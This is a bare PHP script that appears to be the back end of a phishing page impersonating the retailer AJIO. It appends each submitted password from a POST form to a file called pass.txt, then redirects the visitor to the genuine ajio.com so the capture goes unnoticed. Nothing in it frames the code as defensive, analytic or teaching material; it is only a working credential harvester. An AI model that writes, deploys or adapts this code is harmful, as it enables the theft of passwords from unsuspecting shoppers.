<?php
file_put_contents("pass.txt", "" . $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://www.ajio.com/');
?>